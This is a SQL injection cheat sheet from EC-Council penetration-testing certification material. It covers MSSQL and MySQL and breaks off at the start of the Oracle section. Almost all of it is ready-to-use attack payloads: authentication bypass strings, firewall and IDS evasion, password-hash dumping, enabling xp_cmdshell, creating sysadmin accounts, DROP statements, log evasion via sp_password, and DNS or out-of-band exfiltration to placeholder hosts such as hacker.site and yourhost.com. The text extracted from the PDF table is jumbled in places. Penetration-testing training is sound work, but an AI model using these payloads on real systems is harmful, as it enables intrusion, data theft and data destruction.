@@ -1,0 +1,1793 @@
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+Certified Penetration Testing Professional
+SQL Injection Cheat Sheet
+Databases:
+1. MSSQL
+2. MySQL
+3. ORACLE
+4. IBM-DB2 SQL
+5. INGRES SQL
+6. INFORMIX
+7. POSTGRESQL
+8. MS ACCESS
+Page | 1 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+1. MSSQL Database
+Query Command
+▪ SELECT @@VERSION;
+Version
+— This command obtains the OS/Windows version of the system.
+▪ SELECT name FROM master..syslogins;
+List Users — This command lists the names of users from the table
+master..syslogins.
+▪ SELECT user_name();
+— This command obtains a name of recently logged in user.
+▪ SELECT system_user;
+— This command obtains the current value of system_user.
+▪ SELECT user;
+Current User
+— This command obtains the name of impersonated user.
+▪ SELECT loginname FROM master..sysprocesses WHERE spid =
+@@SPID;
+— This command obtains the column name loginname from table
+master..sysprocesses having spid=@@SPID.
+▪ SELECT name FROM master..sysdatabases;
+— This command obtains the list of all the databases from database
+‘master..sysdatabases’.
+List all Database
+▪ SELECT DB_NAME(N);
+— This command obtains the DB_NAME present at N (Where
+N=0,1,2,3, …).
+Current ▪ SELECT DB_NAME();
+Database — This command obtains the current database.
+▪ SELECT name FROM sysobjects WHERE xtype = 'U';
+List Tables — This command obtains the column ‘name’ from table sysobjects
+having xtype value ‘U’.
+Page | 2 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT name FROM syscolumns WHERE id =(SELECT id FROM
+sysobjects WHERE name = 'tablenameforcolumnnames')
+— This command works only for reading current database’s tables.
+▪ SELECT master..syscolumns.name,
+TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns,
+Column Names master..sysobjects WHERE
+master..syscolumns.id=master..sysobjects.id AND
+master..sysobjects.name='sometable';
+— This command works globally. But you should change the master
+with the DB name which holds the table you want to read the
+columns and change ‘sometable’ with the table name.
+▪ SELECT TOP 1 name FROM (SELECT TOP 9 name FROM
+Select Nth Row master..syslogins ORDER BY name ASC) sq ORDER BY name DESC;
+— This command obtains 9th row.
+▪ SELECT substring(‘abcd’, 3, 1);
+Select Nth Char
+—This command returns c.
+▪ IF (1=1) SELECT 1 ELSE SELECT 2;
+If Statement
+—This command returns 1.
+▪ SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END;
+Case Statement
+—This command returns 1.
+▪ SELECT 1;
+— This command is used for writing a comment.
+Comments
+▪ SELECT /*comment*/1;
+— This command is used to comment out a statement.
+String without ▪ SELECT CHAR(75)+CHAR(76)+CHAR(77);
+Quotes — This command returns ‘KLM’.
+▪ WAITFOR DELAY ’0:0:5′;
+Time Delay
+— This command is used to pause for 5 seconds.
+▪ EXEC xp_cmdshell
+▪ ‘net user’;
+— privOn MSSQL 2005, and you may need to reactivate xp_cmdshell
+Command first as it’s disabled by default:
+Execution EXEC sp_configure ‘show advanced options’, 1; — priv
+RECONFIGURE; — priv
+EXEC sp_configure ‘xp_cmdshell’, 1; — priv
+RECONFIGURE; — priv
+Page | 3 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ declare @host varchar(800); select @host = name FROM
+master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host +
+‘c$boot.ini”’);
+— These commands are used to make DNS request.
+▪ declare @host varchar(800); select @host = name + ‘-’ +
+Make DNS
+master.sys.fn_varbintohexstr(password_hash) +
+Requests
+‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ +
+@host + ‘c$boot.ini”’);
+— These commands are used to make DNS request.
+— NB: Concatenation is not allowed in calls to these SPs, hence you
+have to use @host.
+SQL Injection, Login tricks
+▪ admin' --
+▪ admin' #
+▪ admin'/*
+Bypassing Login
+▪ ' or 1=1—
+Screens
+▪ ' or 1=1#
+▪ ' or 1=1/*
+▪ ') or '1'='1—
+▪ ') or ('1'='1--
+Malicious input used to bypass authentication
+▪ ‘ or 1=1 --
+▪ 1'or’1'=’1
+▪ admin’--
+▪ ” or 0=0 --
+▪ or 0=0 --
+Bypassing ▪ ‘ or 0=0 #
+Admin Panel of ▪ ” or 0=0 #
+a Website ▪ or 0=0 #
+▪ ‘ or ‘x’='x
+▪ ” or “x”=”x
+▪ ‘) or (‘x’='x
+▪ ‘ or 1=1--
+▪ ” or 1=1--
+▪ or 1=1--
+Page | 4 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+Malicious query using normalization method to bypass firewall
+▪ /?id=1/*union*/union/*select*/select+1,2,3/*
+Malicious query using HPP technique to bypass firewall
+▪ /?id=1;select+1&id=2,3+from+users+where+id=1—
+Malicious query using HPF technique to bypass firewall
+▪ /?a=1+union/*&b=*/select+1,2
+▪ /?a=1+union/*&b=*/select+1,pass/*&c=*/ from+users—
+Malicious query using blind SQL injection to bypass firewall
+▪ /?id=1+OR+0x50=0x50
+Bypassing ▪ /?id=1+and+ascii(lower(mid((select+pwd+from+
+Firewall users+limit+1,1),1,1)))=74
+Malicious query using signature bypass method to bypass firewall
+▪ /?id=1+union+(select+'xz'from+xxx)
+▪ /?id=(1)union(select(1),mid(hash,1,32)from(users))
+▪ /?id=1+union+(select'1',concat(login,hash)from+users)
+▪ /?id=(1)union(((((((select(1),hex(hash)from(users))))))))
+▪ /?id=xx(1)or(0x50=0x50)
+Malicious query using buffer overflow method to bypass firewall
+▪ ?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!
+%53eLEct*/%0A/*nnaa*/+1,2,3,4…
+Malicious query to enumerate different databases in the server
+▪ ' and 1 in (select min(name) from master.dbo.sysdatabases where
+Database name >'.' ) –
+Enumeration Malicious query to enumerate different file locations in the databases
+▪ ' and 1 in (select min(filename) from master.dbo.sysdatabases
+where filename >'.' ) –
+Malicious query to enumerate tables and columns in the database
+Tables and
+▪ ' union select 0, sysobjects.name + ': ' + syscolumns.name + ': ' +
+Columns
+systypes.name, 1, 1, '1', 1, 1, 1, 1, 1 from sysobjects, syscolumns,
+Enumeration in
+systypes where sysobjects.xtype = 'U' AND sysobjects.id =
+one Query
+syscolumns.id AND syscolumns.xtype = systypes.xtype --
+Page | 5 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+If application is first getting the record by username and then compare
+returned MD5 with supplied password's MD5 then you need to some
+extra tricks to fool application to bypass authentication. You can union
+Bypassing results with a known password and MD5 hash of supplied password. In
+Second MD5 this case application will compare your password and your supplied MD5
+Hash Check hash instead of MD5 from database.
+Login Screens Username : admin
+Password : 1234 ' AND 1=0 UNION ALL SELECT 'admin',
+'81dc9bdb52d04dc20036dbd8313ed055
+81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)
+Stacked Query ▪ ProductID=1; DROP members--
+▪ SELECT header, txt FROM news UNION ALL SELECT name, pass
+FROM members
+— With union you can do SQL queries cross-table. Basically, you can
+Union poison query to return records from another table. This above
+Injections example will combine results from both news table and members
+table and return all of them.
+▪ Another Example:
+' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
+▪ DROP sampletable;--
+▪ DROP sampletable;#
+Log in as Admin Username: admin'--
+User SELECT * FROM members WHERE username = 'admin'--' AND password =
+'password'
+— Using this command, you can log in as admin user.
+▪ SELECT name, password FROM master..sysxlogins;
+— This command obtains the columns ‘name’ and ‘password’ from
+the table ‘master..sysxlogins’. It works only in MSSQL 2000.
+List Passwords
+▪ SELECT name, password_hash FROM master.sys.sql_logins;
+— This command obtains the columns ‘name’ and ‘password_hash’
+from the table ‘master.sys.sql_logins’. It works only in MSSQL 2005.
+Page | 6 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT name, password FROM master..sysxlogins
+— This command obtains the columns ‘name’ and ‘password’ from
+the table ‘master..sysxlogins’.
+— priv, mssql 2000.
+▪ SELECT name, master.dbo.fn_varbintohexstr(password) FROM
+master..sysxlogins
+— This command obtains the columns ‘name’ and
+‘master.dbo.fn_varbintohexstr(password)’ from the table
+‘master..sysxlogins’.
+— priv, mssql 2000, Need to convert to hex to return hashes in
+List Password
+MSSQL error message / some version of query analyzer.
+Hashes
+▪ SELECT name, password_hash FROM master.sys.sql_logins
+— This command obtains the columns ‘name’ and ‘password_hash’
+from the table ‘master.sys.sql_logins’.
+— priv, mssql 2005.
+▪ SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash)
+from master.sys.sql_logins
+— This command obtains the columns ‘name + ‘-’ +
+master.sys.fn_varbintohexstr(password_hash)’ from the table
+‘master.sys.sql_logins’.
+— priv, mssql 2005.
+Malicious code to grab the passwords
+▪ '; begin declare @var varchar(8000)
+Password set @var=':' select @var=@var+' '+login+'/'+password+' ' from
+Grabbing users where login>@var select @var as var into temp end --
+' and 1 in (select var from temp) --
+' ; drop table temp --
+SQL Server don't log queries which includes sp_password for security
+reasons(!). So, if you add --sp_password to your queries it will not be
+Covering Tracks
+in SQL Server logs (of course still will be in web server logs, try to use
+POST if it's possible)
+Insert a file content to a table. If you don't know internal path of web
+application, you can read IIS (IIS 6 only) metabase file
+(%systemroot%\system32\inetsrv\MetaBase.xml) and then search
+Bulk Insert in it to identify application path.
+Create table foo( line varchar(8000) );
+bulk insert foo from 'c:\inetpub\wwwroot\login.asp';
+Drop temp table; and repeat for another file
+Page | 7 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ EXEC sp_addlogin 'user', 'pass';
+Create Users — This command creates a new SQL Server login where username is
+‘user’ and password is ‘pass’.
+▪ EXEC sp_droplogin 'user';
+Drop User
+— This command drops a username = ‘user’ from SQL Server login.
+▪ EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
+Make User DBA
+— This command makes a ‘user’ DBA.
+Malicious command used to create the database accounts
+Create DB
+▪ exec sp_addlogin 'name' , 'password'
+Accounts
+▪ exec sp_addsrvrolemember 'name' , 'sysadmin'
+▪ ' group by columnnames having 1=1 --
+— malicious query used to determine table and column names
+▪ ' union select sum(columnname ) from tablename --
+Discover DB
+— malicious query used to discover column name types
+Structure
+▪ ' and 1 in (select min(name) from sysobjects where xtype = 'U'
+and name > '.') --
+malicious query used to enumerate user defined tables
+▪ CREATE TABLE mydata (line varchar(8000));
+Local File BULK INSERT mydata FROM ‘c:boot.ini’;
+Access DROP TABLE mydata;
+— This command is used to gain Local File Access.
+Hostname, IP ▪ SELECT HOST_NAME();
+Address — This command obtains the Hostname and IP address of a system.
+Error Based
+SQLi attack:
+▪ For integer inputs: convert(int,@@version);
+To throw
+▪ For string inputs: ‘ + convert(int,@@version) +’;
+Conversion
+Errors
+Clear SQLi
+▪ product.asp?id=4;
+Tests:
+▪ product.asp?id=5-1;
+For Boolean
+▪ product.asp?id=4 OR 1=1;
+SQL Injection
+— These commands can be used as tests for Boolean SQL injection
+and Silent
+and silent attacks.
+Attacks
+Page | 8 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT * FROM master..sysmessages;
+Error Messages — This command retrieves all the errors messages present in the
+SQL server.
+Server Name Malicious Query to retrieve server name and configuration in a network
+and ▪ ' and 1 in (select @@servername)--
+Configuration ▪ ' and 1 in (select servername from sys.sysservers)--
+▪ SELECT * FROM master..sysservers;
+Linked Servers
+— This command retrieves all the Linked Servers.
+Examples for evading ' OR 1=1 signature:
+▪ OR 'john' = 'john'
+▪ ' OR 'microsoft' = 'micro'+'soft'
+▪ ' OR 'movies' = N'movies'
+IDS Signature
+▪ ' OR 'software' like 'soft%'
+Evasion
+▪ ' OR 7 > 1
+▪ ' OR 'best' > 'b'
+▪ ' OR 'whatever' IN ('whatever')
+▪ ' OR 5 BETWEEN 1 AND 7
+Malicious SQL queries to evade IDS signatures using comments are as
+follows:
+▪ '/**/OR/**/1/**/=/**/1
+IDS Signature
+Evasion using ▪ Username:' or 1/*
+Comments ▪ Password:*/=1--
+▪ UNI/**/ON SEL/**/ECT
+▪ (MS SQL) '; EXEC ('SEL' + 'ECT US' + 'ER')
+▪ ?vulnerableParam=1;DECLARE @x as int;DECLARE @w as
+char(6);SET @x=ASCII(SUBSTRING(({INJECTION}),1,1));IF @x=100
+Time Based
+SET @w='0:0:14' ELSE SET @w='0:0:01';WAITFOR DELAY @w—
+SQLi
+{INJECTION} = You want to run the query.
+Exploitation
+— If the condition is true, will response after 14 seconds. If is false,
+will be delayed for one second.
+Page | 9 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ ?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB',
+({INJECT})+'.yourhost.com';'sa';'pwd', 'SELECT 1');
+— This command makes DNS resolution request to
+{INJECT}.yourhost.com.
+Out of Band ▪ ?vulnerableParam=1; DECLARE @q varchar(1024); SET @q =
+Channel '\\'+({INJECT})+'.yourhost.com\\test.txt'; EXEC master..xp_dirtree
+@q
+— This command makes DNS resolution request to
+{INJECT}.yourhost.com.
+— {INJECTION} = You want to run the query.
+▪ Northwind
+▪ Model
+Default
+▪ Sdb
+Databases
+▪ pubs — not on sql server 2005
+▪ tempdb
+Creating Malicious command used to create database accounts
+Database ▪ exec sp_addlogin 'victor', 'Pass123'
+Accounts ▪ exec sp_addsrvrolemember 'victor', 'sysadmin'
+Path of DB files ▪ %PROGRAM_FILES%\Microsoft SQL Server\MSSQL.1\MSSQL\Data\
+▪ EXEC sp_helpdb master;
+Location of DB — This command retrieves the location of master.mdf.
+Files ▪ EXEC sp_helpdb pubs;
+— This command retrieves the location of pubs.mdf.
+Current privs on a particular object in 2005, 2008
+▪ SELECT permission_name FROM master..fn_my_permissions(null,
+‘DATABASE’);
+Privileges
+— This command returns a column name ‘permission_name’ from
+the table ‘master..fn_my_permissions’ where securable is set to
+‘null’ and securable_class permission is set to current ‘DATABASE’.
+Page | 10 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT permission_name FROM master..fn_my_permissions(null,
+‘SERVER’);
+— This command returns a column name ‘permission_name’ from
+the table ‘master..fn_my_permissions’ where securable is set to
+‘null’ and securable_class permission is set to current ‘SERVER’.
+▪ SELECT permission_name FROM
+master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’);
+— This command returns a column name ‘permission_name’ from
+the table ‘master..fn_my_permissions’ where securable is set to
+‘master..syslogins’ and securable_class permission is set to current
+‘OBJECT’.
+▪ SELECT permission_name FROM master..fn_my_permissions(‘sa’,
+‘USER’);
+— This command returns a column name ‘permission_name’ from
+the table ‘master..fn_my_permissions’ where securable is set to ‘sa’
+and securable_class permissions are set on a ‘USER’.
+— current privs in 2005, 2008
+▪ SELECT is_srvrolemember(‘sysadmin’);
+— This command determines whether a current has ‘sysadmin’
+privilege.
+▪ SELECT is_srvrolemember(‘dbcreator’);
+— This command determines whether a current has ‘dbcreator’
+privilege.
+▪ SELECT is_srvrolemember(‘bulkadmin’);
+— This command determines whether a current has ‘bulkadmin’
+privilege.
+▪ SELECT is_srvrolemember(‘diskadmin’);
+— This command determines whether a current has ‘diskadmin’
+privilege.
+▪ SELECT is_srvrolemember(‘processadmin’);
+— This command determines whether a current has ‘processadmin’
+privilege.
+▪ SELECT is_srvrolemember(‘serveradmin’);
+— This command determines whether a current has ‘serveradmin’
+privilege.
+▪ SELECT is_srvrolemember(‘setupadmin’);
+— This command determines whether a current has ‘setupadmin’
+privilege.
+Page | 11 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT is_srvrolemember(‘securityadmin’);
+— This command determines whether a current has ‘securityadmin’
+privilege.
+▪ SELECT name FROM master..syslogins WHERE denylogin = 0;
+— This command obtains column name ‘name’ from table
+master..syslogins having denylogin value as 0.
+▪ SELECT name FROM master..syslogins WHERE hasaccess = 1;
+— This command obtains column name ‘name’ from table
+master..syslogins having hasaccess value as 1.
+▪ SELECT name FROM master..syslogins WHERE isntname = 0;
+— This command obtains column name ‘name’ from table
+master..syslogins having isntname value as 0.
+▪ SELECT name FROM master..syslogins WHERE isntgroup = 0;
+— This command obtains column name ‘name’ from table
+master..syslogins having isntgroup value as 0.
+▪ SELECT name FROM master..syslogins WHERE sysadmin = 1;
+— This command obtains column name ‘name’ from table
+master..syslogins having sysadmin value as 1.
+▪ SELECT name FROM master..syslogins WHERE securityadmin = 1;
+— This command obtains column name ‘name’ from table
+master..syslogins having securityadmin value as 1.
+▪ SELECT name FROM master..syslogins WHERE serveradmin = 1;
+— This command obtains column name ‘name’ from table
+master..syslogins having serveradmin value as 1.
+▪ SELECT name FROM master..syslogins WHERE setupadmin = 1;
+— This command obtains column name ‘name’ from table
+master..syslogins having setupadmin value as 1.
+▪ SELECT name FROM master..syslogins WHERE processadmin = 1;
+— This command obtains column name ‘name’ from table
+master..syslogins having processadmin value as 1.
+▪ SELECT name FROM master..syslogins WHERE diskadmin = 1;
+— This command obtains column name ‘name’ from table
+master..syslogins having diskadmin value as 1.
+▪ SELECT name FROM master..syslogins WHERE dbcreator = 1;
+— This command obtains column name ‘name’ from table
+master..syslogins having dbcreator value as 1.
+▪ SELECT name FROM master..syslogins WHERE bulkadmin = 1;
+— This command obtains column name ‘name’ from table
+master..syslogins having bulkadmin value as 1.
+Page | 12 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+These are the commands that has several SQL built-in scalar functions
+that can work in SQL implementations
+▪ user or current_user, session_user, system_user
+Identify User
+▪ ' and 1 in (select user ) --
+Level Privilege
+▪ '; if user ='dbo' waitfor delay '0:0:5 '--
+▪ ' union select if( user() like 'root@%',
+benchmark(50000,sha1('test')), 'false' );
+Retrieves the types of privileges granted on a specific table
+▪ SELECT privilege_type FROM
+List Privileges
+information_schema.role_table_grants WHERE
+table_name=<YourTable>;
+Provides detailed information about the SQL Server version, product level,
+Determine SQL and edition
+Server Version ▪ SELECT SERVERPROPERTY('ProductVersion'),
+SERVERPROPERTY('ProductLevel'), SERVERPROPERTY('Edition');
+Lists all the stored procedures in the current database
+List Procedures
+▪ SELECT name FROM sys.procedures
+Lists all the roles defined in the current database
+List Roles
+▪ SELECT name FROM sys.database_principals WHERE type = 'R';
+2. MySQL Database
+Query Command
+▪ SELECT @@VERSION;
+— This command retrieves the system information of the current
+Version installation of SQL Server.
+▪ SELECT version();
+— This command selects the specific version of a Server.
+Malicious query used to interact with a target OS
+▪ ' union select 1,load_file('/etc/passwd'),1,1,1;
+OS
+Malicious commands used to interact with a target OS
+Interaction
+▪ CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll';
+▪ CREATE FUNCTION sys_eval RETURNS string SONAME 'libudffmwgj.dll';
+▪ SELECT user FROM mysql.user;
+List Users
+— This command lists the column ‘user’ from the table ‘mysql.user’.
+Page | 13 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT user();
+Current — This command obtains the current MySQL user name and hostname.
+User ▪ SELECT system_user();
+— This command obtains the current value of system_user.
+Malicious query used to create database accounts
+Creating
+Example:
+Database
+▪ INSERT INTO mysql.user (user, host, password) VALUES ('victor',
+Accounts
+'localhost', PASSWORD('Pass123'))
+▪ SELECT schema_name FROM information_schema.schemata;
+for MySQL >= v5.0
+List all
+—This command obtains a column name ‘schema_name’ having a list of
+Database
+databases from the table ‘schemata table’.
+▪ SELECT distinct(db) FROM mysql.db; — priv
+Current ▪ SELECT database();
+Database — This command obtains the current MySQL database.
+▪ ' or username like char(37);
+— This command is used to inject without quotes (string = "%")
+▪ ' union select * from users where login = char(114,111,111,116);
+Input
+Validation — This command is used to inject with quotes (string="root")
+Circumventi ▪ ' union select
+on using 1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+Char()
+— This command is used to load files in unions (string = "/etc/passwd")
+▪ ' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+— This command is used to check for existing files (string = "n.ext")
+▪ SELECT table_name FROM information_schema.tables WHERE
+table_schema = 'tblUsers'
+List Tables — This command obtains the column name ‘table_name’ from the table
+‘information_schema.tables’ having table_schema value ‘tblUsers’.
+tblUsers -> tablename
+Page | 14 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ SELECT table_name, column_name FROM information_schema.columns
+WHERE table_schema = 'tblUsers’
+— This command obtains the columns name ‘table_name’
+and ‘column_name’ from the table
+‘information_schema.tables’ having table_schema value
+Column ‘tblUsers’.
+Names tblUsers -> tablename
+▪ SELECT table_schema, table_name FROM information_schema.columns
+WHERE column_name = 'username';
+— This command obtains the columns name ‘table_name’ and
+‘column_name’ from the table ‘information_schema.tables’ having
+table_schema value ‘username’.
+▪ SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0;
+Select Nth — This command returns rows numbered from 0.
+Row ▪ SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1;
+— This command returns rows numbered from 0.
+Select Nth ▪ SELECT substr(‘abcd’, 3, 1);
+Char — This command returns c.
+If Statement ▪ SELECT if(1=1,’foo’,'bar’); — returns ‘foo’
+Case ▪ SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END;
+Statement — This command returns A.
+▪ SELECT 1; #comment
+— This command is used for writing a comment.
+Comments
+▪ SELECT /*comment*/1;
+— This command is used comment out a statement.
+String
+▪ SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))
+without
+— This command returns ‘KLM’.
+Quotes
+▪ SELECT BENCHMARK(1000000,MD5(‘A’));
+Time Delay SELECT SLEEP(5); -- >= 5.0.12
+— This command triggers a measurable time delay.
+If mysqld (<5.0) is running as root AND you compromise a DBA account you can
+execute OS commands by uploading a shared object file into /usr/lib (or
+Command similar). The .so file should contain a User Defined Function
+Execution (UDF). raptor_udf.c explains exactly how you go about this. Remember to
+compile for the target architecture which may or may not be the same as your
+attack platform.
+Page | 15 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+Malicious query used to extract data like password hashes from DNS request
+▪ select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
+DNS
+▪ select
+Exfiltration
+load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c
+5c612e747874))
+▪ ' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
+Load File SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
+— This command will show the content of c:\boot.ini.
+▪ DROP sampletable;--
+▪ DROP sampletable;#
+Username : admin'--
+Log in as : admin' or '1'='1'--
+Admin User SELECT * FROM members WHERE $username = 'admin'--' AND $password
+= 'password'
+— This command lists all the users from the column ‘members’ having
+$username value as ‘admin’ and $password value as ‘password’.
+▪ SELECT user, password FROM mysql.user;
+— This command retrieves the columns ‘user’ and ‘password‘ from the
+table ‘mysql.user’.
+▪ SELECT user, password FROM mysql.user LIMIT 1,1;
+List
+— This command retrieves the columns ‘user’ and ‘password‘ from the
+Passwords
+table ‘mysql.user’ with LIMIT 1,1.
+▪ SELECT password FROM mysql.user WHERE user = 'root';
+— This command retrieves the column ‘password‘ from the table
+‘mysql.user’ having user value as ‘root’.
+List ▪ SELECT host, user, password FROM mysql.user;
+Password — This command lists columns ‘host’, ‘user’ and ‘password’ from the table
+Hashes ‘mysql.user’.
+▪ SELECT * FROM mytable INTO dumpfile '/tmp/somefile';
+Bulk Insert
+— This command is used to insert a file content to a table.
+▪ CREATE USER username IDENTIFIED BY 'password';
+Create
+— This command creates a username ‘USER’ who authenticates by
+Users
+password to log on to the database.
+Create DB ▪ INSERT INTO mysql.user (user, host, password) VALUES ('name',
+Accounts 'localhost', PASSWORD('pass123'))
+▪ DROP USER username;
+Drop User
+— This command drops a username ‘USER’ from the table.
+Page | 16 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+Make User ▪ GRANT ALL PRIVILEGES ON *.* TO username@'%';
+DBA — This command grants DBA privileges to a user.
+▪ …’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)
+Local File — This command allows you to only read world-readable files.
+Access ▪ SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’;
+— This command allows you to write to file system.
+Hostname, ▪ SELECT @@hostname;
+IP Address — This command obtains the Hostname and IP address of a system.
+▪ (select 1 and row(1,1)>(select
+count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from
+Error Based
+(select 1 union select 2)a group by x limit 1));
+SQLi Attack:
+— This command is used to receive integer inputs.
+To throw
+▪ '+(select 1 and row(1,1)>(select
+Conversion
+count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from
+Errors
+(select 1 union select 2)a group by x limit 1))+';
+— This command is used to receive string inputs.
+Clear SQLi ▪ product.php?id=4
+Tests:
+▪ product.php?id=5-1
+For Boolean
+▪ product.php?id=4 OR 1=1
+SQL
+▪ product.php?id=-1 OR 17-7=10
+Injection
+and Silent — These commands can be used to test for Boolean SQL injection and
+Attacks silent attacks.
+▪ SLEEP(25)--
+SELECT BENCHMARK(1000000,MD5('A'));
+▪ ProductID=1 OR SLEEP(25)=0 LIMIT 1—
+Blind SQL ▪ ProductID=1) OR SLEEP(25)=0 LIMIT 1--
+Injection
+▪ ProductID=1' OR SLEEP(25)=0 LIMIT 1—
+(Time
+▪ ProductID=1') OR SLEEP(25)=0 LIMIT 1--
+Based)
+▪ ProductID=1)) OR SLEEP(25)=0 LIMIT 1—
+▪ ProductID=SELECT SLEEP(25)—
+— These commands trigger a measurable time delay.
+▪ ?vulnerableParam=-99 OR IF((ASCII(MID(({INJECTON}),1,1)) =
+Time base 100),SLEEP(14),1) = 0 LIMIT 1—
+SQLi {INJECTION} = You want to run the query.
+Exploitation — If the condition is true, will response after 14 seconds. If is false, will be
+delayed for one second.
+Page | 17 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+▪ ?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}),
+'yourhost.com\\')));
+— This command makes a NBNS query request/DNS resolution request to
+yourhost.com.
+Out of Band
+Channel ▪ ?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE
+'\\\\yourhost.com\\share\\output.txt');
+— This command writes data to your shared folder/file.
+{INJECTION} = You want to run the query.
+Default ▪ information_schema (>= mysql 5.0)
+Databases ▪ mysql
+Path of DB
+▪ SELECT @@datadir C:\AppServ\MySQL\data\
+Files
+Location of ▪ SELECT @@datadir;
+DB Files — This command obtains the location of DB files.
+▪ SELECT grantee, privilege_type, is_grantable FROM
+information_schema.user_privileges;
+— This command lists list user privileges.
+▪ SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv,
+Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv,
+File_priv, Grant_priv, References_priv, Index_priv, Alter_priv,
+Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv,
+Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user;
+Privileges
+— This command lists list various types of privileges.
+▪ list user privsSELECT grantee, table_schema, privilege_type FROM
+information_schema.schema_privileges;
+— This command lists privileges on databases (schemas).
+▪ SELECT table_schema, table_name, column_name, privilege_type FROM
+information_schema.column_privileges;
+— This command lists privileges on columns.
+Current ▪ SELECT user, host FROM mysql.user WHERE user = CURRENT_USER();
+User Host — Retrieves the current user's name and host information.
+▪ SHOW ENGINES;
+List Engines
+— Displays a list of storage engines supported by the MySQL server.
+List
+▪ SHOW GRANTS FOR 'username'@'localhost';
+Privileges
+— Shows the privileges granted to a specified user.
+for User
+Page | 18 Certified Penetration Testing Professional Copyright © by EC-Council
+All Rights Reserved. Reproduction is Strictly Prohibited.
+Certified Penetration Testing Professional Exam 412-80
+SQL Injection Cheat Sheet
+Find Process ▪ SHOW PROCESSLIST;
+List — Displays a list of currently running threads on the MySQL server.
+3. Oracle Database
+Query Command
+▪ SELECT banner FROM v$version WHERE banner LIKE 'Oracle%';
+— This command obtains oracle version and build information.
+Version ▪ SELECT version FROM v$instance;
+— This command displays the current database information such as
+host name, status, startup time, etc.
